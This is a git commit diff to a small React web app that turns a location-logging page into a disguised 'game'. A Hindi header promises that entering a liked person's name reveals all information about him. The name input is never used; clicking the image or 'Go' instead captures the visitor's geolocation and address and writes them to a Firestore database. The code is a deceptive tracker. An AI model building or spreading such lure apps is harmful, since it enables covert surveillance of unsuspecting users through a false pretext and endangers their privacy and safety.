5751fd362c71706135e707e96cfabcc79db0e84d
vkkundal <vinodkumar1805@gmail.com>
2023-12-26 23:34:56 +0530

    new code changes

--- src/App.js
+++ src/App.js
@@ -1,6 +1,7 @@
-// import logo from './logo.svg';
 import { useState } from 'react'
-// import { doc, setDoc, deleteDoc } from "firebase/firestore";
+import partner from '../src/Image/partner.jpg';
+import love from '../src/Image/love.jpg';
+// import { doc, setDoc, deleteDoc,serverTimestamp } from "firebase/firestore";
 import { doc, setDoc } from "firebase/firestore";
 import db from './firebase';
 import './App.css';
@@ -9,7 +10,7 @@ function App() {
   const [lat, setLat] = useState();
   const [lon, setLon] = useState();
   const [userAddress, setUserAddress] = useState();
-
+  // const [city, setCity] = useState();
   console.log("latitude:", lat, lon);
 
   const geo = navigator.geolocation
@@ -38,15 +39,16 @@ function App() {
   //   latitude: lat,
   //   longitude: lon,
   //   Address: userAddress,
+  //   timestamp: serverTimestamp()
   // await deleteDoc(doc(db, "cities", "LA"))
-  // };
+  // })};
   // Add a new document in collection "cities"
   const Push = async () => {
     const cityRef = doc(db, "state", "cities");
-    await setDoc(cityRef, { latitude: lat, longitude: lon, Address: userAddress }, { merge: true });
+    await setDoc(cityRef, { latitude: lat, longitude: lon, address: userAddress }, { merge: true });
     console.log(cityRef, "push data");
   }
-  const Play = async () => {
+  const Play = () => {
     getUserAddress();
     Push();
   }
@@ -57,16 +59,28 @@ function App() {
   return (
     <>
       <div className="App">
-        <h1> Current location</h1>
+        {/* <h1> Play and get your partner details</h1>
         <h1> latitude -{lat}</h1>
         <h1> longitude -{lon}</h1>
-        <h1> user Address -{userAddress}</h1>
-        <button onClick={Play}>Play Game</button><br />
-        <button onClick={stopGPS}>Stop Gps</button>
+        <h1> user Address -{userAddress}</h1> */}
+        {/* <img src={partners} onClick={Play} className="center" alt="" /> */}
+        {/* <button onClick={Play}>Play Game</button><br /> */}
+        {/* <button onClick={stopGPS}>Stop Gps</button> */}
         {/* <button onClick={Push}>Stop</button> */}
-      </div>     
-    </>
+        {/* <h2 className="App-header">Enter any name which you like very much, you will get all information about him</h2> */}
+        <h2 className="App-header">कोई भी नाम डालें जो आपको बहुत पसंद हो, आपको उसके बारे में सारी जानकारी मिल जाएगी</h2>
+        <img src={love} onClick={Play} className="responsive" alt="" />
+        < div className="fly" >
+          <div className="inp-box">
+            <input
+              type="text"
+            />
+            <button onClick={Play}>Go</button>
+          </div>
+        </div >
+      </div>
 
+    </>
   );
 }
 
